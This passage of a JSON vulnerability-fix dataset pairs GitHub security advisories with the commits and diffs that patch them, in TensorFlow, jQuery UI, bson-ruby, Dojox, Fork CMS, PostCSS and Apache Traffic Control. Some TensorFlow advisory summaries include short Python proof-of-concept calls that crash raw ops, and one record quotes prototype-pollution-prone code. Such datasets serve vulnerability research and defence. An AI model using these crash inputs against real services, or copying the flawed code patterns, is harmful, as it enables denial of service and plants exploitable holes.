out_backprop_shape.dims() == 5,\\n+        errors::InvalidArgument(\"out_backprop tensor must have 5 dimensions\"));\\n     OP_REQUIRES(\\n         context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n         errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n@@ -936,6 +973,11 @@ class Conv3DCustomBackpropFilterOp : public OpKernel {\\n \\n     const int64 work_unit_size = size_A + size_B + size_C;\\n \\n+    OP_REQUIRES(\\n+        context, work_unit_size > 0,\\n+        errors::InvalidArgument(\"input, filter_sizes and out_backprop tensors \"\\n+                                \"must all have at least 1 element\"));\\n+\\n     const size_t shard_size =\\n         (target_working_set_size + work_unit_size - 1) / work_unit_size;'}}",
      "message_norm": "eliminate a division by 0 in 3d convolutions.\n\nalso prevent a check failed introduced in the most recent change.\n\npiperorigin-revid: 369322073\nchange-id: i4f609c028f89565fb2b49c3fdd20b63496582bae",
      "language": "en",
      "entities": "[('division by 0', 'SECWORD', ''), ('prevent', 'ACTION', ''), ('369322073', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/conv_grad_ops_3d.cc'])",
      "num_files": 1.0
    },
    {
      "index": 3146,
      "vuln_id": "GHSA-vmjw-c2vp-p33c",
      "cwe_id": "{'CWE-681'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', 'https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d'}",
      "dataset": "osv",
      "summary": "Crash in NMS ops caused by integer conversion to unsigned ### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],\n  scores=[1.0,2.0,3.0],\n  max_output_size=-1,\n  iou_threshold=0.5,\n  score_threshold=0.5,\n  soft_nms_sigma=1.0,\n  pad_to_max_output_size=True)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/image/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:\n\n```cc\n  const int output_size = max_output_size.scalar<int>()();\n  // ...\n  std::vector<int> selected;\n  // ...\n  if (pad_to_max_output_size) {\n    selected.resize(output_size, 0);\n    // ...\n  }\n```\n    \nHowever, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.\n\nA similar issue occurs in `CombinedNonMaxSuppression`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  clip_boxes=True)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
      "published_date": "2021-08-25",
      "chain_len": 2,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58",
      "commit_sha": "b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58",
      "patch": "MULTI",
      "chain_ord": "['b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', '3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d']",
      "before_first_fix_commit": "{'a87fa31dc3becc97c7e945b9b8c8711acb92fc12'}",
      "last_fix_commit": "3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d",
      "chain_ord_pos": 1.0,
      "commit_datetime": "07/30/2021, 05:24:52",
      "message": "Prevent overflow due to integer conversion to unsigned.\n\nPiperOrigin-RevId: 387738045\nChange-Id: Id7e95bc07e02df1c66b72bd09f389608c87bdebe",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 0, 'total': 2}",
      "files": "{'tensorflow/core/kernels/image/non_max_suppression_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58/tensorflow%2Fcore%2Fkernels%2Fimage%2Fnon_max_suppression_op.cc', 'patch': '@@ -930,6 +930,8 @@ class CombinedNonMaxSuppressionOp : public OpKernel {\\n         errors::InvalidArgument(\"max_size_per_class must be 0-D, got shape \",\\n                                 max_output_size.shape().DebugString()));\\n     const int max_size_per_class = max_output_size.scalar<int>()();\\n+    OP_REQUIRES(context, max_size_per_class > 0,\\n+                errors::InvalidArgument(\"max_size_per_class must be positive\"));\\n     // max_total_size: scalar\\n     const Tensor& max_total_size = context->input(3);\\n     OP_REQUIRES('}}",
      "message_norm": "prevent overflow due to integer conversion to unsigned.\n\npiperorigin-revid: 387738045\nchange-id: id7e95bc07e02df1c66b72bd09f389608c87bdebe",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('387738045', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/image/non_max_suppression_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 2805,
      "vuln_id": "GHSA-qqxp-xp9v-vvx6",
      "cwe_id": "{'CWE-79'}",
      "score": 0.0,
      "chain": "{'https://github.com/jquery/jquery-ui/commit/f2854408cce7e4b7fc6bf8676761904af9c96bde', 'https://github.com/jquery/jquery-ui/commit/5fee6fd5000072ff32f2d65b6451f39af9e0e39e'}",
      "dataset": "osv",
      "summary": "Moderate severity vulnerability that affects jquery-ui Cross-site scripting (XSS) vulnerability in the default content option in jquery.ui.tooltip.js in the Tooltip widget in jQuery UI before 1.10.0 allows remote attackers to inject arbitrary web script or HTML via the title attribute, which is not properly handled in the autocomplete combo box demo.",
      "published_date": "2017-10-24",
      "chain_len": 2,
      "project": "https://github.com/jquery/jquery-ui",
      "commit_href": "https://github.com/jquery/jquery-ui/commit/5fee6fd5000072ff32f2d65b6451f39af9e0e39e",
      "commit_sha": "5fee6fd5000072ff32f2d65b6451f39af9e0e39e",
      "patch": "MULTI",
      "chain_ord": "['5fee6fd5000072ff32f2d65b6451f39af9e0e39e', 'f2854408cce7e4b7fc6bf8676761904af9c96bde']",
      "before_first_fix_commit": "{'5fee6fd5000072ff32f2d65b6451f39af9e0e39e'}",
      "last_fix_commit": "f2854408cce7e4b7fc6bf8676761904af9c96bde",
      "chain_ord_pos": 1.0,
      "commit_datetime": "11/27/2012, 15:52:19",
      "message": "Autocomplete demo: Combobox: Encode search term inside tooltips. Fixes #8859 - Autocomplete: XSS in combobox demo.",
      "author": "Scott Gonz\u00e1lez",
      "comments": "{'com_1': {'author': 'jzaefferer', 'datetime': '11/27/2012, 16:05:23', 'body': \"Doesn't this just hide the underlying tooltip vulnerability? If so, tooltip would have to use `.text()` instead of `.html()`, and make it sane to override that.\"}, 'com_2': {'author': 'scottgonzalez', 'datetime': '11/27/2012, 16:13:04', 'body': \"hmm...yeah, tooltip should handle this in the default `content` option. Good catch, I'll fix that.\"}, 'com_3': {'author': 'scottgonzalez', 'datetime': '11/27/2012, 16:22:17', 'body': 'Fixed in f2854408cce7e4b7fc6bf8676761904af9c96bde.'}}",
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'demos/autocomplete/combobox.html': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/jquery/jquery-ui/raw/5fee6fd5000072ff32f2d65b6451f39af9e0e39e/demos%2Fautocomplete%2Fcombobox.html', 'patch': '@@ -61,7 +61,7 @@\\n \\t\\t\\t\\t\\t\\t// remove invalid value, as it didn\\'t match anything\\n \\t\\t\\t\\t\\t\\t$( element )\\n \\t\\t\\t\\t\\t\\t\\t.val( \"\" )\\n-\\t\\t\\t\\t\\t\\t\\t.attr( \"title\", value + \" didn\\'t match any item\" )\\n+\\t\\t\\t\\t\\t\\t\\t.attr( \"title\", $( \"<a>\" ).text( value ).html() + \" didn\\'t match any item\" )\\n \\t\\t\\t\\t\\t\\t\\t.tooltip( \"open\" );\\n \\t\\t\\t\\t\\t\\tselect.val( \"\" );\\n \\t\\t\\t\\t\\t\\tsetTimeout(function() {'}}",
      "message_norm": "autocomplete demo: combobox: encode search term inside tooltips. fixes #8859 - autocomplete: xss in combobox demo.",
      "language": "pt",
      "entities": "[('encode', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#8859', 'ISSUE', ''), ('xss', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['demos/autocomplete/combobox.html'])",
      "num_files": 1.0
    },
    {
      "index": 2007,
      "vuln_id": "GHSA-h6rj-8r3c-9gpj",
      "cwe_id": "{'CWE-400'}",
      "score": 9.8,
      "chain": "{'https://github.com/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999'}",
      "dataset": "osv",
      "summary": "bson is vulnerable to denial of service due to incorrect regex validation BSON injection vulnerability in the legal? function in BSON (bson-ruby) gem before 3.0.4 for Ruby allows remote attackers to cause a denial of service (resource consumption) or inject arbitrary data via a crafted string.",
      "published_date": "2018-03-05",
      "chain_len": 1,
      "project": "https://github.com/mongodb/bson-ruby",
      "commit_href": "https://github.com/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999",
      "commit_sha": "976da329ff03ecdfca3030eb6efe3c85e6db9999",
      "patch": "SINGLE",
      "chain_ord": "['976da329ff03ecdfca3030eb6efe3c85e6db9999']",
      "before_first_fix_commit": "{'7446d7c6764dfda8dc4480ce16d5c023e74be5ca'}",
      "last_fix_commit": "976da329ff03ecdfca3030eb6efe3c85e6db9999",
      "chain_ord_pos": 1.0,
      "commit_datetime": "06/04/2015, 04:19:42",
      "message": "Use \\A \\z for checking regex on legal",
      "author": "Durran Jordan",
      "comments": "{'com_1': {'author': 'judofyr', 'datetime': '06/04/2015, 16:53:06', 'body': 'Yay! Thanks for a quick patch.'}, 'com_2': {'author': 'cheald', 'datetime': '06/04/2015, 19:17:08', 'body': \"Is the 1.x series going to see a patch? Users who aren't using bson_ext (such as users on JRuby) are still vulnerable.\"}, 'com_3': {'author': 'estolfo', 'datetime': '06/04/2015, 19:19:06', 'body': 'Yes, it will be released this afternoon.'}, 'com_4': {'author': 'estolfo', 'datetime': '06/04/2015, 19:20:30', 'body': \"It's in master already.\"}, 'com_5': {'author': 'cheald', 'datetime': '06/04/2015, 19:21:58', 'body': 'Perfect, thanks. https://github.com/mongodb/mongo-ruby-driver/blob/1.x-stable/lib/bson/types/object_id.rb for anyone else who ends up here looking for it, like me. :)'}, 'com_6': {'author': 'estolfo', 'datetime': '06/04/2015, 20:44:37', 'body': 'mongo 1.12.3 and bson 1.12.3 are released with this fix.'}}",
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'lib/bson/object_id.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/mongodb/bson-ruby/raw/976da329ff03ecdfca3030eb6efe3c85e6db9999/lib%2Fbson%2Fobject_id.rb', 'patch': '@@ -282,7 +282,7 @@ def from_time(time, options = {})\\n       #\\n       # @since 2.0.0\\n       def legal?(string)\\n-        string.to_s =~ /^[0-9a-f]{24}$/i ? true : false\\n+        string.to_s =~ /\\\\A[0-9a-f]{24}\\\\z/i ? true : false\\n       end\\n \\n       # Executes the provided block only if the size of the provided object is'}}",
      "message_norm": "use \\a \\z for checking regex on legal",
      "language": "en",
      "entities": null,
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/bson/object_id.rb'])",
      "num_files": 1.0
    },
    {
      "index": 3397,
      "vuln_id": "GHSA-x8h6-xgqx-jqgp",
      "cwe_id": "{'CWE-908'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925'}",
      "dataset": "osv",
      "summary": "Undefined behavior and `CHECK`-fail in `FractionalMaxPoolGrad` ### Impact\nThe implementation of `tf.raw_ops.FractionalMaxPoolGrad` triggers an undefined behavior if one of the input tensors is empty:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([2, 3], shape=[1, 1, 1, 2], dtype=tf.int64)\norig_output = tf.constant([], dtype=tf.int64) \nout_backprop = tf.zeros([2, 3, 6, 6], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n```\n\nThe code is also vulnerable to a denial of service attack as a `CHECK` condition becomes false and aborts the process\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([1], shape=[1], dtype=tf.int64)\norig_output = tf.constant([1], shape=[1], dtype=tf.int64)\nout_backprop = tf.constant([1, 1], shape=[2, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64) \ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/169054888d50ce488dfde9ca55d91d6325efbd5b/tensorflow/core/kernels/fractional_max_pool_op.cc#L215) fails to validate that input and output tensors are not empty and are of the same rank. Each of these unchecked assumptions is responsible for the above issues.\n\n### Patches\nWe have patched the issue in GitHub commit [32fdcbff9d06d010d908fcc4bd4b36eb3ce15925](https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925",
      "commit_sha": "32fdcbff9d06d010d908fcc4bd4b36eb3ce15925",
      "patch": "SINGLE",
      "chain_ord": "['32fdcbff9d06d010d908fcc4bd4b36eb3ce15925']",
      "before_first_fix_commit": "{'169054888d50ce488dfde9ca55d91d6325efbd5b'}",
      "last_fix_commit": "32fdcbff9d06d010d908fcc4bd4b36eb3ce15925",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/06/2021, 05:39:29",
      "message": "Validate arguments of `FractionalMaxPoolGrad`\n\nPiperOrigin-RevId: 372274982\nChange-Id: If46b0c442efa4eaef635ce6a476717060420122c",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 14, 'deletions': 0, 'total': 14}",
      "files": "{'tensorflow/core/kernels/fractional_max_pool_op.cc': {'additions': 14, 'deletions': 0, 'changes': 14, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925/tensorflow%2Fcore%2Fkernels%2Ffractional_max_pool_op.cc', 'patch': '@@ -235,6 +235,20 @@ class FractionalMaxPoolGradOp : public OpKernel {\\n \\n     // Just to make it similar to FractionalMaxPoolOp.\\n     constexpr int tensor_in_and_out_dims = 4;\\n+    OP_REQUIRES(\\n+        context, tensor_in.dims() == tensor_in_and_out_dims,\\n+        errors::InvalidArgument(\"orig_input should be a tensor of rank 4, got \",\\n+                                tensor_in.DebugString()));\\n+    OP_REQUIRES(context, tensor_in.NumElements() > 0,\\n+                errors::InvalidArgument(\"orig_input must not be empty, got \",\\n+                                        tensor_in.DebugString()));\\n+    OP_REQUIRES(context, tensor_out.dims() == tensor_in_and_out_dims,\\n+                errors::InvalidArgument(\\n+                    \"orig_output should be a tensor of rank 4, got \",\\n+                    tensor_out.DebugString()));\\n+    OP_REQUIRES(context, tensor_out.NumElements() > 0,\\n+                errors::InvalidArgument(\"orig_output must not be empty, got \",\\n+                                        tensor_out.DebugString()));\\n     std::vector<int64> input_size(tensor_in_and_out_dims);\\n     std::vector<int64> output_size(tensor_in_and_out_dims);\\n     for (int i = 0; i < tensor_in_and_out_dims; ++i) {'}}",
      "message_norm": "validate arguments of `fractionalmaxpoolgrad`\n\npiperorigin-revid: 372274982\nchange-id: if46b0c442efa4eaef635ce6a476717060420122c",
      "language": "en",
      "entities": "[('validate', 'ACTION', ''), ('372274982', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/fractional_max_pool_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 260,
      "vuln_id": "GHSA-3hw5-q855-g6cw",
      "cwe_id": "{'CWE-94'}",
      "score": 7.7,
      "chain": "{'https://github.com/dojo/dojox/commit/47d1b302b5b23d94e875b77b9b9a8c4f5622c9da'}",
      "dataset": "osv",
      "summary": "Prototype Pollution in Dojox The Dojox jQuery wrapper `jqMix` mixin method is vulnerable to Prototype Pollution. \n\nAffected Area:\n```\n//https://github.com/dojo/dojox/blob/master/jq.js#L442\n\t\tvar tobj = {};\n\t\tfor(var x in props){\n\t\t\t// the \"tobj\" condition avoid copying properties in \"props\"\n\t\t\t// inherited from Object.prototype.  For example, if obj has a custom\n\t\t\t// toString() method, don't overwrite it with the toString() method\n\t\t\t// that props inherited from Object.prototype\n\t\t\tif((tobj[x] === undefined || tobj[x] != props[x]) && props[x] !== undefined && obj != props[x]){\n\t\t\t\tif(dojo.isObject(obj[x]) && dojo.isObject(props[x])){\n\t\t\t\t\tif(dojo.isArray(props[x])){\n\t\t\t\t\t\tobj[x] = props[x];\n\t\t\t\t\t}else{\n\t\t\t\t\t\tobj[x] = jqMix(obj[x], props[x]);\n\t\t\t\t\t}\n\t\t\t\t}else{\n\t\t\t\t\tobj[x] = props[x];\n\t\t\t\t}\n```",
      "published_date": "2020-03-10",
      "chain_len": 1,
      "project": "https://github.com/dojo/dojox",
      "commit_href": "https://github.com/dojo/dojox/commit/47d1b302b5b23d94e875b77b9b9a8c4f5622c9da",
      "commit_sha": "47d1b302b5b23d94e875b77b9b9a8c4f5622c9da",
      "patch": "SINGLE",
      "chain_ord": "['47d1b302b5b23d94e875b77b9b9a8c4f5622c9da']",
      "before_first_fix_commit": "{'5491effdb1b586f1a5f5b173460fe26e23abcfe6'}",
      "last_fix_commit": "47d1b302b5b23d94e875b77b9b9a8c4f5622c9da",
      "chain_ord_pos": 1.0,
      "commit_datetime": "03/10/2020, 14:25:04",
      "message": "Merge pull request from GHSA-3hw5-q855-g6cw\n\nPrevent the special __proto__ property name from being mixed in to\nprevent polluting the prototoype of the object being mixed into in the\njqMix function in jq.js",
      "author": "Nick Nisi",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'jq.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/dojo/dojox/raw/47d1b302b5b23d94e875b77b9b9a8c4f5622c9da/jq.js', 'patch': \"@@ -455,7 +455,7 @@ dojo.query differences that cause some tests to fail:\\n \\t\\t\\t// inherited from Object.prototype.  For example, if obj has a custom\\n \\t\\t\\t// toString() method, don't overwrite it with the toString() method\\n \\t\\t\\t// that props inherited from Object.prototype\\n-\\t\\t\\tif((tobj[x] === undefined || tobj[x] != props[x]) && props[x] !== undefined && obj != props[x]){\\n+\\t\\t\\tif(x !== '__proto__ ' && ((tobj[x] === undefined || tobj[x] != props[x])) && props[x] !== undefined && obj != props[x]){\\n \\t\\t\\t\\tif(dojo.isObject(obj[x]) && dojo.isObject(props[x])){\\n \\t\\t\\t\\t\\tif(dojo.isArray(props[x])){\\n \\t\\t\\t\\t\\t\\tobj[x] = props[x];\"}}",
      "message_norm": "merge pull request from ghsa-3hw5-q855-g6cw\n\nprevent the special __proto__ property name from being mixed in to\nprevent polluting the prototoype of the object being mixed into in the\njqmix function in jq.js",
      "language": "en",
      "entities": "[('ghsa-3hw5-q855-g6cw', 'VULNID', 'GHSA'), ('prevent', 'ACTION', ''), ('prevent', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['jq.js'])",
      "num_files": 1.0
    },
    {
      "index": 2718,
      "vuln_id": "GHSA-q863-cchm-c6c6",
      "cwe_id": "{'CWE-89'}",
      "score": 7.5,
      "chain": "{'https://github.com/forkcms/forkcms/commit/7a12046a67ae5d8cf04face3ee75e55f03a1a608'}",
      "dataset": "osv",
      "summary": "SQL Injection in Fork CMS Fork CMS contains a SQL injection vulnerability in versions prior to version 5.11.1. When deleting submissions which belong to a formular (made with module `FormBuilder`), the parameter `id[]` is vulnerable to SQL injection.",
      "published_date": "2022-03-25",
      "chain_len": 1,
      "project": "https://github.com/forkcms/forkcms",
      "commit_href": "https://github.com/forkcms/forkcms/commit/7a12046a67ae5d8cf04face3ee75e55f03a1a608",
      "commit_sha": "7a12046a67ae5d8cf04face3ee75e55f03a1a608",
      "patch": "SINGLE",
      "chain_ord": "['7a12046a67ae5d8cf04face3ee75e55f03a1a608']",
      "before_first_fix_commit": "{'1b38e33a98992793e998a937b717355212346993'}",
      "last_fix_commit": "7a12046a67ae5d8cf04face3ee75e55f03a1a608",
      "chain_ord_pos": 1.0,
      "commit_datetime": "03/23/2022, 12:16:53",
      "message": "Prevent sql injection through the ids of the action",
      "author": "Jelmer Prins",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 0, 'total': 1}",
      "files": "{'src/Backend/Modules/FormBuilder/Engine/Model.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https://github.com/forkcms/forkcms/raw/7a12046a67ae5d8cf04face3ee75e55f03a1a608/src%2FBackend%2FModules%2FFormBuilder%2FEngine%2FModel.php', 'patch': \"@@ -152,6 +152,7 @@ public static function delete(int $id): void\\n     public static function deleteData(array $ids): void\\n     {\\n         $database = BackendModel::getContainer()->get('database');\\n+        $ids = array_map('intval', $ids);\\n \\n         $database->delete('forms_data', 'id IN(' . implode(',', $ids) . ')');\\n         $database->delete('forms_data_fields', 'data_id IN(' . implode(',', $ids) . ')');\"}}",
      "message_norm": "prevent sql injection through the ids of the action",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('sql injection', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/Backend/Modules/FormBuilder/Engine/Model.php'])",
      "num_files": 1.0
    },
    {
      "index": 2146,
      "vuln_id": "GHSA-hwj9-h5mp-3pm3",
      "cwe_id": "{'CWE-400'}",
      "score": 5.3,
      "chain": "{'https://github.com/postcss/postcss/commit/54cbf3c4847eb0fb1501b9d2337465439e849734', 'https://github.com/postcss/postcss/commit/b6f3e4d5a8d7504d553267f80384373af3a3dec5', 'https://github.com/postcss/postcss/commit/8682b1e4e328432ba692bed52326e84439cec9e4'}",
      "dataset": "osv",
      "summary": "Regular Expression Denial of Service in postcss The npm package `postcss` from 7.0.0 and before versions 7.0.36 and 8.2.10 is vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.",
      "published_date": "2021-05-10",
      "chain_len": 3,
      "project": "https://github.com/postcss/postcss",
      "commit_href": "https://github.com/postcss/postcss/commit/54cbf3c4847eb0fb1501b9d2337465439e849734",
      "commit_sha": "54cbf3c4847eb0fb1501b9d2337465439e849734",
      "patch": "MULTI",
      "chain_ord": "['8682b1e4e328432ba692bed52326e84439cec9e4', 'b6f3e4d5a8d7504d553267f80384373af3a3dec5', '54cbf3c4847eb0fb1501b9d2337465439e849734']",
      "before_first_fix_commit": "{'12832f3d203474bd273bd06bd3b2407567bfe09e'}",
      "last_fix_commit": "54cbf3c4847eb0fb1501b9d2337465439e849734",
      "chain_ord_pos": 3.0,
      "commit_datetime": "06/11/2021, 02:38:48",
      "message": "Backport ReDoS vulnerabilities from PostCSS 8",
      "author": "Andrey Sitnik",
      "comments": null,
      "stats": "{'additions': 4, 'deletions': 2, 'total': 6}",
      "files": "{'lib/previous-map.es6': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https://github.com/postcss/postcss/raw/54cbf3c4847eb0fb1501b9d2337465439e849734/lib%2Fprevious-map.es6', 'patch': '@@ -73,12 +73,14 @@ class PreviousMap {\\n \\n   getAnnotationURL (sourceMapString) {\\n     return sourceMapString\\n-      .match(/\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\s*\\\\*\\\\//)[1]\\n+      .match(/\\\\/\\\\*\\\\s*# sourceMappingURL=((?:(?!sourceMappingURL=).)*)\\\\*\\\\//)[1]\\n       .trim()\\n   }\\n \\n   loadAnnotation (css) {\\n-    let annotations = css.match(/\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\s*\\\\*\\\\//mg)\\n+    let annotations = css.match(\\n+      /\\\\/\\\\*\\\\s*# sourceMappingURL=(?:(?!sourceMappingURL=).)*\\\\*\\\\//gm\\n+    )\\n \\n     if (annotations && annotations.length > 0) {\\n       // Locate the last sourceMappingURL to avoid picking up'}}",
      "message_norm": "backport redos vulnerabilities from postcss 8",
      "language": "en",
      "entities": "[('redos', 'SECWORD', ''), ('vulnerabilities', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/previous-map.es6'])",
      "num_files": 1.0
    },
    {
      "index": 243,
      "vuln_id": "GHSA-3f8r-4qwm-r7jf",
      "cwe_id": "{'CWE-287'}",
      "score": 9.8,
      "chain": "{'https://github.com/apache/trafficcontrol/commit/f780aff77a52d52a37b4d1cc3e8e801c0b557356'}",
      "dataset": "osv",
      "summary": "Improper Authentication in Apache Traffic Control Improper authentication is possible in Apache Traffic Control versions 3.0.0 and 3.0.1 if LDAP is enabled for login in the Traffic Ops API component. Given a username for a user that can be authenticated via LDAP, it is possible to improperly authenticate as that user without that user's correct password.",
      "published_date": "2021-05-18",
      "chain_len": 1,
      "project": "https://github.com/apache/trafficcontrol",
      "commit_href": "https://github.com/apache/trafficcontrol/commit/f780aff77a52d52a37b4d1cc3e8e801c0b557356",
      "commit_sha": "f780aff77a52d52a37b4d1cc3e8e801c0b557356",
      "patch": "SINGLE",
      "chain_ord": "['f780aff77a52d52a37b4d1cc3e8e801c0b557356']",
      "before_first_fix_commit": "{'85596a08bb12835370895ba20455e5ce998278d1'}",
      "last_fix_commit": "f780aff77a52d52a37b4d1cc3e8e801c0b557356",
      "chain_ord_pos": 1.0,
      "commit_datetime": "08/30/2019, 20:40:48",
      "message": "Improve ldap error handling",
      "author": "Rawlin Peters",
      "comments": null,
      "stats": "{'additions': 4, 'deletions': 0, 'total': 4}",
      "files": "{'traffic_ops/traffic_ops_golang/login/login.go': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/apache/trafficcontrol/raw/f780aff77a52d52a37b4d1cc3e8e801c0b557356/traffic_ops%2Ftraffic_ops_golang%2Flogin%2Flogin.go', 'patch': '@@ -51,6 +51,10 @@ func LoginHandler(db *sqlx.DB, cfg config.Config) http.HandlerFunc {\\n \\t\\t\\thandleErrs(http.StatusBadRequest, err)\\n \\t\\t\\treturn\\n \\t\\t}\\n+\\t\\tif form.Username == \"\" || form.Password == \"\" {\\n+\\t\\t\\tapi.HandleErr(w, r, nil, http.StatusBadRequest, errors.New(\"username and password are required\"), nil)\\n+\\t\\t\\treturn\\n+\\t\\t}\\n \\t\\tresp := struct {\\n \\t\\t\\ttc.Alerts\\n \\t\\t}{}'}}",
      "message_norm": "improve ldap error handling",
      "language": "da",
      "entities": "[('improve', 'ACTION', ''), ('ldap', 'SECWORD', ''), ('error handling', 'SECWORD', '')]",
      "classification_level_1": null,
